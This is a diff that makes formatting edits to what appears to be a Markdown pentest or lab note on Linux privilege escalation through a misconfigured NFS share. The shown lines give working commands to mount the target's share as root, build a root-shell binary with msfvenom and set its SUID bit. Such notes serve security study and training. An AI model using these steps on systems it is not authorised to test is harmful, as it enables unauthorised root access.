@@ -17,9 +17,9 @@ When we're inside the target machine, we have to check if it's an **NFS (Network
 
 ## Second step - on our machine
 - We have to log in as root, so `sudo su`.
-- Then let's create the NFS share: `mkdir /tmp/nfs`.
-- And let's mount the remote directory on it: `mount -o rw,vers=3 <Target IP>:<Remote dir> /tmp/nfs` 
-- Now we have to create a `rootshell.elf` file to run a privileged shell: `msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/rootshell.elf`
+- Then let's create the NFS share:\`mkdir /tmp/nfs`.
+- And let's mount the remote directory on it:<br>`mount -o rw,vers=3 <Target IP>:<Remote dir> /tmp/nfs` 
+- Now we have to create a `rootshell.elf` file to run a privileged shell:<br>`msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/rootshell.elf`
 - In the end, let's set the SUID bit: `chmod +xs /tmp/nfs/rootshell.elf` 
 
 ## Last step - on the target
